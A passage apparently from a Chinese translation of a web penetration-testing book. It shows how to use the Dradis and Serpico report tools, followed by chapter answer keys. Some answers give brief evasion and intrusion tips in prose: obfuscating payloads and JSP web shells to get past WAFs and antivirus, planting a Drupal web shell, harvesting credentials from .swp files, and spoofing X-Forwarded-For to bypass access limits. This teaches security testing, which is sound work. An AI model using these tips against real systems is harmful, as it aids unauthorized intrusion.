现在，我们需要转到 Dradis 文件夹。要安装 Dradis，我们需要在 bin 文件夹中运行设置文件，输入以下内容：

```
./bin/setup
```

安装完成后，我们可以运行以下命令来启动 Dradis 服务器，如下屏幕截图所示：

```
bundle exec rails server
```

以下屏幕截图显示了上述命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/65a5f247-0437-4688-b2de-735d8e2cc02e.png)

可以通过转到`https://localhost:3000`来访问 Dradis。

我们甚至可以使用 Docker 镜像来避免安装步骤和在此过程中可能出现的任何错误。

现在，我们需要设置密码，以便可以访问框架并登录，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/c6a5efda-4682-4c27-bc0c-72a346ebbfb8.png)

现在，让我们开始使用 Dradis。

# 开始使用 Dradis

成功登录后，我们将被重定向到仪表板，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/8d2ffbd4-c32e-44c6-abfb-7aa872e9c622.png)

Dradis Framework 的免费版本支持各种工具的插件，例如 Nmap、Acunetix、Nikto 和 Metasploit。它还允许我们创建在渗透测试活动期间可以使用的方法论。在平台的左侧窗格中，我们可以看到三个主要部分，可以帮助报告开发过程 - 所有问题、方法论和垃圾箱：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/240619ec-26c5-4ec1-93d2-baf92b417262.png)

**所有问题**：此页面允许我们手动或通过导入来自不同工具（如 Nmap、Nikto 和 Nessus）的输出找到的问题。单击此选项将重定向我们到以下页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/3f40e953-febd-453d-90c1-89d39b44f13f.png)

现在，让我们学习如何将第三方报告导入 Dradis。

# 将第三方报告导入 Dradis

要从工具的输出中导入问题，请按照以下步骤操作：

1.  选择第三个选项“上传工具的输出”，这将带我们到以下页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/6bde2701-2093-4f90-a9dc-a64270db224c.png)

1.  向下滚动将显示已安装的插件列表，以及它们的工具名称，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/67f2410f-b1bd-4f90-b328-dc82c69b2ab6.png)

1.  上传报告将显示解析后的输出，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5a1769ed-66c8-40db-ad5c-c36f0193bce1.png)

1.  导入完成后，我们将在左侧窗格下看到结果，即插件输出，如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/721235f8-ba4e-499e-aaba-efbdf8f4c4cf.png)

1.  我们刚刚导入的扫描结果的输出如下：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/ac577801-d5ad-4de5-b556-1188df933c08.png)

现在，我们需要定义安全测试方法。

# 在 Dradis 中定义安全测试方法

方法论部分允许我们定义在活动期间将遵循的方法论。最常用的方法论是开放源安全测试方法手册（OSSTMM），渗透测试执行标准（PTES）和国家标准技术研究所。我们甚至可以通过定义一个检查表来创建自己的方法论，如下所示：

1.  要创建检查表，请转到方法论，然后单击“添加新内容”。您将看到以下屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b221f185-d14a-4f51-9d96-28d9ca63eb8a.png)

1.  然后，我们需要为其指定一个名称，然后单击“添加到项目”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9f64441a-f50b-45e0-a0c9-0bb62679759b.png)

1.  我们应该看到已为我们创建了一个示例列表。单击右侧的“编辑”按钮即可进行编辑：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/4011674d-bcce-4514-9bd7-cc49bf458ea8.png)

1.  在这里，我们可以看到列表是在一个 XML 文件中。我们可以通过单击“更新方法”来编辑和保存它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/5fde0e4f-24f1-496f-a74e-48fbb60d317c.png)

现在，让我们组织我们的报告。

# 使用 Dradis 组织报告

现在，让我们学习如何组织我们的扫描报告。**节点**允许我们为不同的子网、网络和办公地点创建单独的部分，然后将所有问题或截图放在那里。让我们快速看一下如何创建一个节点：

1.  转到左侧菜单中的节点选项，然后单击+号；一个弹出框将打开，我们在其中添加一个网络范围。这样做后，单击“添加”：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/79aa12d4-a985-4931-b924-9a702a39c101.png)

1.  要添加一个新的子节点，我们需要从左侧窗格中选择节点，然后选择“添加子节点”选项。子节点用于进一步组织网络。我们甚至可以添加注释和截图作为特定节点中可能发现的错误的证据：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/49c7b1bc-1f38-426d-8aef-edb05ac284b4.png)

最后，让我们学习如何在 Dradis 中导出报告。

# 在 Dradis 中导出报告

使用 Dradis Framework，可以导入、组合和导出不同的扫描报告为一个单一的报告，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/a935c425-709f-468a-b888-240169ab1636.png)

注意：有关 Dradis 的更多信息可以在官方网站[`dradisframework.com/`](https://dradisframework.com/)上找到。

到目前为止，我们已经学会了如何安装和设置 Dradis Framework。我们还看了如何在 Dradis 中导入、组织和导出报告。在下一节中，我们将看看另一个名为 Serpico 的工具。

# 使用 Serpico

**Serpico**，或者**SimplE RePort wrIting and COllaboration**工具，是一个用 Ruby 开发的工具，用于加快报告编写的过程。它是开源的，与平台无关，并且可以在 GitHub 上获得。在本节中，我们将介绍 Serpico 的基本安装和使用。

# 安装和设置

对于 64 位 Linux 系统，安装很容易 - 我们只需从工具的发布部分下载并安装文件，网址为[`github.com/SerpicoProject/Serpico/releases`](https://github.com/SerpicoProject/Serpico/releases)。

由于 Serpico 有一个 Docker 镜像，我们将在我们的用例中使用它。

首先，我们需要设置数据库和用户名和密码。要做到这一点，运行以下命令：

```
ruby first_time.rb
```

以下截图显示了前面命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/30a3f279-2f70-4984-bcb9-d709f69c1872.png)

然后，我们使用`ruby serpico.rb`运行工具：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/be1e42a6-3f88-4bda-aa31-72c4e68c77f7.png)

就是这样 - 现在，我们已经准备好开始使用这个工具了，现在可以在`http://127.0.0.1:8443`上访问它。

# 开始使用 Serpico

以下截图显示了 Serpico 的登录界面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b71b7e6f-48c8-42b2-b946-f0b54541abe7.png)

在使用用户名和密码登录后，您将看到一个类似以下的仪表板：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/0e857bb5-7dfc-4321-a8af-a851d9267382.png)

一旦我们登录，我们将看到各种可用选项，如添加用户，添加模板等，如前一个截图的左侧窗格中所示。

要创建一个新报告，请按照以下步骤进行：

1.  从顶部菜单中单击“新报告”选项。我们将被重定向到以下页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/77b21d0a-e39f-4230-927b-66c86f270d72.png)

在这里，我们可以填写各种细节，比如完整的公司名称、评估类型等。

1.  单击保存按钮将带我们到下一页，在那里我们可以填写其余的细节，比如联系邮箱等等。所有这些信息都将打印在最终报告上。

1.  下一步是将我们的模板数据库发现添加到工具中。如果我们想要遵循常见的发现模板，比如 SQLi 和 XSS，我们可以选择从模板中添加发现，或者我们可以选择创建新的发现：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/d556a103-31de-4d30-a1bc-bb5847674f3c.png)

1.  单击模板将下载相应的 Word 文档。它应该看起来类似于以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/84f1fa16-4c80-43c4-a379-114f9265276d.png)

1.  要为特定的漏洞添加模板，我们只需选中复选框，然后选择位于页面底部的“添加”按钮。

随着我们不断填充报告的漏洞，我们将看到我们的结构正在形成，并且图表现在更加有意义。我们甚至可以从 Metasploit 数据库直接添加附件和管理主机。

稍后，可以使用“导出报告”功能将其导出为单个报告。Serpico 还支持各种插件，可用于从不同工具（如 Burp Suite 和 Nessus）导入数据。

# 从 Metasploit 导入数据到 Serpico

让我们看看如何连接 Serpico 到 Metasploit 来导入数据。首先，我们需要编辑要连接到 Metasploit 的报告。我们将被重定向到一个新页面。从左侧菜单中选择“附加功能”。以下页面将打开：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/55bb86fc-89e6-4121-9fce-70d67b5cf122.png)

现在，让我们启动我们的 Metasploit RPC 服务，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/92b50ff4-842f-434d-a635-2e82c044ac1a.png)

完成此操作后，我们需要在浏览器中切换回 Serpico，并单击“配置 Metasploit RPC 连接”，这将带我们到以下页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/e2cec21b-1790-416f-8bb9-d71f800ea704.png)

填写连接详细信息并保存这些设置将连接 Serpico 到 Metasploit。通过这样做，所有发现将被添加到报告中。

# 将第三方报告导入 Serpico

与 Dradis 类似，我们还可以从其他工具导入发现到 Serpico 的报告中。让我们快速学习如何从 Nessus 以及 Burp Suite 导入发现。

在编辑报告时，在“附加功能”页面上，我们可以选择“从 Nessus XML 自动添加发现”选项，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/9cfd86c9-db4a-4cf0-926c-66995780e889.png)

我们将被重定向到一个新页面，我们可以在该页面上传 Nessus 的 XML 文件，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/bd61f909-cdf4-4255-b672-5f65c8fc9e9f.png)

在选择“从 Burp 扫描器报告自动添加发现”选项时，我们有上传 Burp 扫描器报告的选项，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/56c513b5-159e-4c43-a07e-5af29341ecee.png)

然后，Burp Suite 报告将被解析为 Serpico 格式，并且报告中的结果将显示在 Serpico 的主面板上，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/07986d3f-da78-447c-9082-df984c636bd1.png)

现在我们知道如何从第三方工具导入扫描报告到 Serpico，让我们学习如何管理用户。

# Serpico 中的用户管理

用户管理对于组织是必要的，特别是当渗透测试团队庞大时。Serpico 还允许我们管理用户，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/dc291ef0-f3a5-455e-87d1-819216523775.png)

Serpico 支持两种类型的用户授权：**本地授权**和**基于 Active Directory（AD）的授权**。一旦用户被添加，可以通过单击左侧窗格中的“列出用户”链接来查看当前用户列表，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/b792e1df-e99f-4b15-b18b-e63af884092d.png)

除了用户管理外，Serpico 还允许我们管理报告模板。

# 在 Serpico 中管理模板

Serpico 还允许我们使用从 Microsoft Word 衍生的元语言创建自定义报告模板。我们可以从“添加报告模板”页面定义和上传自定义报告模板，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/hsn-web-pentest-mtspl/img/43adedaf-b399-4148-897a-3fe188ad2b64.png)

互联网上还有许多其他用户创建和共享的预构建模板。

# 以多种格式生成报告

Serpico 允许我们以不同的格式生成报告：

+   **仅文本格式**

+   **CSV 格式**

+   ASCII Doc 格式

+   演示格式（包括 PDF）

+   HTML 格式

这就是我们对 Dradis Framework 和 Serpico 的快速介绍。

有关 Serpico 的更多信息，请访问[`github.com/SerpicoProject/SerpicoPlugins/wiki/Main-Page`](https://github.com/SerpicoProject/SerpicoPlugins/wiki/Main-Page)。

# 摘要

在本章中，我们介绍了报告撰写及其两种类型。我们还使用了两个工具- Dradis 和 Serpico。现在您已经熟悉它们的框架，可以使用它们生成和组织报告。

这就是我们又一个了不起的旅程的结束。我们希望您喜欢这本书。我们始终欢迎您的反馈，因为它有助于我们改进和创造更好的内容。随时与我们联系以获取任何进一步的查询，并别忘了向您的朋友推荐这本书！

# 问题

1.  Serpico 支持的元语言是什么？

1.  渗透测试报告应包括哪些必要项目？

1.  还可以使用哪些其他工具进行自动报告撰写？

1.  Dradis 和 Serpico 是否支持 Microsoft Windows？

# 进一步阅读

以下链接提供了有关 Dradis 和 Serpico 的更多信息：

+   [`dradisframework.com/ce/`](https://dradisframework.com/ce/)

+   [`github.com/SerpicoProject/Serpico`](https://github.com/SerpicoProject/Serpico)

+   [`github.com/SerpicoProject/Serpico/wiki/Serpico-Meta-Language-In-Depth`](https://github.com/SerpicoProject/Serpico/wiki/Serpico-Meta-Language-In-Depth)

+   [`github.com/SerpicoProject/SerpicoPlugins/wiki/Main-Page`](https://github.com/SerpicoProject/SerpicoPlugins/wiki/Main-Page)


# 第二十一章：评估

# 第一章

1.  是的，有。MITRE 维护的 CWE 列表可以在[`cwe.mitre.org/`](https://cwe.mitre.org/)找到。

1.  OWASP 十大漏洞可以在[`owasp.org/www-project-top-ten/`](https://owasp.org/www-project-top-ten/)找到，而 SANS 25 大软件错误可以在[`www.sans.org/top25-software-errors/`](https://www.sans.org/top25-software-errors/)找到。

1.  在典型的渗透测试中使用的许多工具都是开源的，例如 Nmap 和 Metasploit 框架。但是，市场上还有一些非常高效的工具，例如 BurpSuite 专业版和 Nessus 专业版。

1.  基于 OSSTMM 的渗透测试可以是六种不同类型之一，具体取决于参与的性质和范围。基于 PTES 的渗透测试被归类为非常通用的测试类型，例如白盒测试、灰盒测试和黑盒测试。由于 PTES 是*行业标准*，大多数渗透测试都使用 PTES 方法论。

# 第二章

1.  Metasploit 社区版和 Metasploit Framework 是开源的。Metasploit Pro 是商业版，附带许多额外功能。请查看以下链接获取更多信息：[`www.rapid7.com/products/metasploit/download/editions/`](https://www.rapid7.com/products/metasploit/download/editions/)

1.  Metasploit Framework 版本 5 允许我们使用`AES`或`RC4`加密对我们的有效载荷进行加密。您只需使用 MSFVenom 中的`--encrypt`选项生成有效载荷即可。

1.  不，不能。目前，Metasploit Framework 仅支持 PostgreSQL 作为后端。

1.  Metasploit Framework 数据库可以直接通过端口`5432`连接。如果您想通过安全通道与数据库通信，可以使用运行在 HTTP/HTTPS 上的 PostgreSQL Web 服务将 Metasploit Framework 连接到数据库。

# 第三章

1.  从基本的网络侦察到链式任务，有很多功能可以使用。在 Metasploit CE 中，许多功能被锁定，仅适用于 Metasploit Pro Edition。

1.  要使用自定义 SSL 证书，请将 Metasploit Web UI 附带的默认 SSL 证书替换为您自己的证书，方法是转到`<path/to/metasploit>/opt/metasploit/nginx/cert`并用您自己的文件替换那里的文件。

1.  Web 界面兼容 Google Chrome 10+，Mozilla Firefox 18+，Internet Explorer 10+和 Iceweasel 18+。

1.  是的，可以。RESTful API 在 Metasploit 产品的所有版本中都可用。请查看[`metasploit.help.rapid7.com/docs/standard-api-methods-reference`](https://metasploit.help.rapid7.com/docs/standard-api-methods-reference)以查看标准 Metasploit API 文档。

1.  是的，可以。您可以在 Metasploit Web 界面中检查自定义报告格式，并相应地进行配置。请查看以下链接获取更多信息，网址为[`metasploit.help.rapid7.com/docs/about-reports`](https://metasploit.help.rapid7.com/docs/about-reports)。

# 第四章

1.  HTTP 头检测模块获取服务器响应中的 HTTP 头。如果管理员已经阻止/删除了 HTTP 头，此模块将不会提供任何输出。该模块运行良好。

1.  默认情况下，Metasploit Web 界面附带 NMAP 版本 4.x（预安装）的软件包，用于执行主机发现和端口扫描。为了获得更好的结果，您可以安装和使用最新版本的 NMAP。

1.  是的，可以。Web 界面只为 Metasploit 框架提供了**图形用户界面**（**GUI**），因此您也可以添加自定义模块。

1.  您可以在页面前面放置一个反向代理。您首先必须使用 HTTP 基本身份验证机制进行身份验证，然后可以使用登录页面与 Metasploit Web 界面进行身份验证。有关更多信息，请查看文档[`docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/`](https://docs.nginx.com/nginx/admin-guide/web-server/reverse-proxy/)。

# 第五章

1.  是的，您可以。GitHub 上有许多著名的字典可用于更好的枚举结果。

1.  Metasploit 使您有权修改或添加自己的模块，这些模块可以根据不同的模块运行执行。您可以选择编写自定义模块，也可以编写自己的 Metasploit 插件，用于在单个命令中自动执行整个枚举过程。

1.  正则表达式用于高效过滤搜索。使用正则表达式，您可以执行更加专注的抓取，而不是更多垃圾导向的抓取。

# 第六章

1.  这完全取决于扫描运行的频率和并发性。最少可以使用两个客户端节点和一个主节点进行分布式扫描，但您可以根据要扫描的系统数量做出决定。

1.  当在 Metasploit 中加载 WMAP 插件时，将在与之连接的数据库中保存所有结果。注意：此插件中没有特定功能会生成 WMAP 报告。

1.  Metasploit Framework 支持的所有格式都在`db_import`命令中提到。请参考该命令。

1.  WMAP 是用 Ruby 编写的插件。您可以编辑文件并根据需要修改代码。在进行任何修改之前，请阅读`LICENCE`文件。

1.  WMAP 每个节点限制为 25 个作业。这是为了防止节点负担过重。

# 第七章

1.  不是真的。Nessus 可以安装在任何服务器上，您只需要提供网络 IP 和用于身份验证的端口凭据。Metasploit 将自动与远程安装的 Nessus 实例进行身份验证。

1.  Metasploit 支持 Nexpose、Nessus 和 OpenVAS 漏洞扫描器作为可插拔模块。对于其他漏洞扫描器，您可能需要编写自己的插件模块。

1.  是的。您可以将 Nessus Professional 与 Metasploit 一起使用。您只需要首先激活 Nessus Pro 许可证。

1.  扫描中的并发系统数量与您的 Nessus 订阅允许的数量相同。

# 第八章

1.  是的。如果 WordPress 安装了默认配置，则本章讨论的侦察技术足以获取有关所有 WordPress 版本的信息。

1.  如果`wp-admin`目录不可访问，您可以尝试`wp-login.php`文件。该文件对具有普通权限设置的用户以及对`wp-admin`目录也是可访问的。如果您仍然无法访问，请尝试将`wp-login.php?action=register`查询添加到 URI。

1.  是的，WordPress 是一个广泛使用的开源 CMS。与 WordPress 核心不同，一些主题和模板是根据付费订阅许可证的。

# 第九章

1.  Joomla 是用 PHP 编写的 CMS，并且将在安装有 PHP 的操作系统上运行。

1.  如果您已经使用了社区不知道的检测技术，可以将该技术添加到 Metasploit 代码中。同时，您可以向 Metasploit GitHub 存储库发送`push`请求，这应该也有助于社区。

1.  有多种方法可以找到安装的版本。您甚至可以阅读源代码以找到披露 Joomla 版本的标头或参数。

1.  渗透测试人员的目标是找到漏洞并利用它，以使组织管理层相信不应忽视 Web 应用程序的安全性。在应用程序中设置后门将违反这一逻辑，这是不道德的。

# 第十章

1.  不同的 Drupal 版本具有不同的架构和不同的功能。如果利用漏洞基于 Drupal 的核心组件，它也可以用于旧版本。其他基于模块和插件的漏洞可能在不同的 Drupal 版本中无法工作。

1.  在本地安装 Drupal 以测试漏洞是一个好习惯。如果我们成功地在本地利用 Drupal，那么我们可以在远程 Drupal 站点上使用相同的漏洞。

1.  有时，Web 应用程序防火墙（WAF）放置在 Web 应用程序前面，这意味着漏洞无法成功运行。在这种情况下，我们可以对漏洞中使用的有效载荷进行混淆或编码，并绕过 WAF 保护。

1.  如果我们可以访问 Drupal 管理员帐户，我们可以启用 PHP 过滤器模块并配置其权限。一旦权限设置好，我们就可以在网站上编写一个 Web shell。我们甚至可以通过利用任意文件上传漏洞来上传 Web shell（这在某些 Drupal 版本上有效）。

1.  在执行文件和目录枚举时，如果我们遇到`.swp`文件，我们可以利用这一点。SWP（发音为*swap*）文件是一个存储文件中发生的更改的状态文件。有时，管理员会编辑 Drupal 配置文件（`settings.php`），这意味着会创建一个`.swp`文件。如果我们可以访问`settings.php.swp`文件，我们就可以获取全局设置变量，如数据库用户名和密码，这可以用于进一步的利用。

# 第十一章

JBoss 有不同的版本和发布。社区版是免费下载的，但您需要购买许可证来支持它。您可以在[`www.redhat.com/en/store/red-hat-jboss-enterprise-application-platform?extIdCarryOver=true&sc_cid=701f2000001Css5AAC`](https://www.redhat.com/en/store/red-hat-jboss-enterprise-application-platform?extIdCarryOver=true&sc_cid=701f2000001Css5AAC)查看许可信息。

# 第十二章

1.  您可以使用 Shodan、ZoomEye、Censys.io 和类似的服务来识别它们。您还可以通过执行端口扫描和服务枚举来识别它们。有时，Tomcat 服务可能不会在常用端口（如`80`、`443`、`8080`等）上运行。在这种情况下，执行完整的端口扫描，并通过服务器响应来识别服务。

1.  并不一定。`Release-Notes.txt`和`Changelog.html`文件仅在默认安装时可用。如果服务器管理员已删除这些文件，您需要寻找其他方法（在本章中提到）来检测和识别 Apache Tomcat 实例。

1.  这通常发生在反病毒程序检测到 JSP Web shell 时。为了绕过这样的安全措施，您可以对 Web shell 进行混淆。

1.  在基于 OOB 的 OGNL 注入中，有两种方式可以利用这个漏洞——通过 DNS 交互或通过 HTTP 交互。在这两种情况下，您需要设置自己的实例并配置 DNS 服务器（用于 DNS 交互）或 HTTP Web 服务器（用于 HTTP 交互）。在进行 HTTP 交互攻击时，利用基于 OOB 的 OGNL 更容易。

# 第十三章

1.  您可以使用 Shodan、ZoomEye、Censys 等工具来识别 Jenkins 实例。默认情况下，Jenkins 服务在端口`8080`上运行。

1.  有多种方法可以识别 Jenkins，但最常见的方法是使用 HTTP 标头。`X-Hudson`、`X-Jenkins`、`X-Jenkins-Session`和`X-Permission-Implied-By`标头是 Jenkins 使用的自定义 HTTP 标头。

1.  您可以通过 HTTP 标头来查看是否有任何类型的标头阻止您访问 Jenkins 实例。您还可以添加一个`X-Forwarded-For: 127.0.0.1`标头来绕过任何类型的入口访问限制。

1.  Jenkins 是一个用 Java 构建的开源工具，通过使用基于插件的机制来帮助 CI 和 CD。如果您可以访问 Jenkins 实例，可以中断 CI/CD 流水线以关闭生产/非生产环境。由于 Jenkins 保存了应用程序的所有代码，您可以下载源代码以获取硬编码的凭据和敏感信息，然后可以用于进一步的利用。

# 第十四章

1.  您可以在运行 Web 服务的任何服务器上执行 Web 应用程序模糊测试（包括 SSL）。

1.  Burp Suite 是一个基于 Java 的工具，可以在 Microsoft Windows 上使用，但对于 Wfuzz 和 ffuf，您必须在 Windows 上安装 Python，因为这些工具是基于 Python 的。

1.  不。在常规渗透测试中进行模糊测试是可选的，需要与客户讨论。如果客户要求，那么它将是强制性的；否则，渗透测试可以在不进行模糊测试的情况下进行。然而，总是进行模糊测试是一个好习惯，因为您可能会发现扫描器错过的严重漏洞。

1.  这些漏洞范围从技术漏洞，如远程代码执行（RCE）、SQL 注入（SQLi）和跨站脚本（XSS）到逻辑漏洞，如账户接管、参数操纵、响应操纵和身份验证令牌绕过。

# 第十五章

1.  用于 Microsoft Word 的元语言被设计得尽可能简单，同时还具有足够的功能，可以创建基本的渗透测试报告。这是一种用于在 Serpico 中创建自定义模板的语言（在它们的 GitHub 存储库中定义）。要了解有关 Serpico 中元语言的更多信息，请参阅[`github.com/SerpicoProject/Serpico/wiki/Serpico-Meta-Language-In-Depth`](https://github.com/SerpicoProject/Serpico/wiki/Serpico-Meta-Language-In-Depth)。

1.  通用的渗透测试报告应包括漏洞名称、漏洞描述、受影响的端点、复制步骤（概念验证）、业务影响、纠正措施和参考资料。

1.  Guinevere、Prithvi 和许多其他开源自动化报告工具都是公开可用的，可用于轻松生成报告。

1.  是的。Dradis Framework 和 Serpico 都是用 Ruby 编写的，它们是跨平台支持的工具，可以在 Microsoft Windows 上运行。唯一的要求是 Ruby 软件包需要安装在 Windows 系统上。
